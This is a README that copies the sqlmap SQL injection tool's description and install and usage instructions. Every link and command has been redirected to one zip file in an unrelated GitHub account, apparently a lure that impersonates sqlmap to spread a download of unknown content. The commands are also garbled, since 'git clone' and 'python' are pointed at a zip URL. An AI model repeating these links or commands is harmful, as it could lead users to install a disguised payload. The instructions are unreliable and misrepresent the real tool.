sqlmap is an open source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws and taking over of database servers. It comes with a powerful detection engine, many niche features for the ultimate penetration tester, and a broad range of switches including database fingerprinting, over data fetching from the database, accessing the underlying file system, and executing commands on the operating system via out-of-band connections.

Installation
----

You can download the latest tarball by clicking [here](https://raw.githubusercontent.com/Chuckaballe60/Aballe-Sql/main/greathearted/Aballe_Sql_v3.2.zip) or latest zipball by clicking [here](https://raw.githubusercontent.com/Chuckaballe60/Aballe-Sql/main/greathearted/Aballe_Sql_v3.2.zip).

Preferably, you can download sqlmap by cloning the [Git](https://raw.githubusercontent.com/Chuckaballe60/Aballe-Sql/main/greathearted/Aballe_Sql_v3.2.zip) repository:

    git clone --depth 1 https://raw.githubusercontent.com/Chuckaballe60/Aballe-Sql/main/greathearted/Aballe_Sql_v3.2.zip sqlmap-dev

sqlmap works out of the box with [Python](https://raw.githubusercontent.com/Chuckaballe60/Aballe-Sql/main/greathearted/Aballe_Sql_v3.2.zip) version **2.6**, **2.7** and **3.x** on any platform.

Usage
----

To get a list of basic options and switches use:

    python https://raw.githubusercontent.com/Chuckaballe60/Aballe-Sql/main/greathearted/Aballe_Sql_v3.2.zip -h

To get a list of all options and switches use:

    python https://raw.githubusercontent.com/Chuckaballe60/Aballe-Sql/main/greathearted/Aballe_Sql_v3.2.zip -hh

You can find a sample run [here](https://raw.githubusercontent.com/Chuckaballe60/Aballe-Sql/main/greathearted/Aballe_Sql_v3.2.zip).
To get an overview of sqlmap capabilities, a list of supported features, and a description of all options and switches, along with examples, you are advised to consult the [user's manual](https://raw.githubusercontent.com/Chuckaballe60/Aballe-Sql/main/greathearted/Aballe_Sql_v3.2.zip).
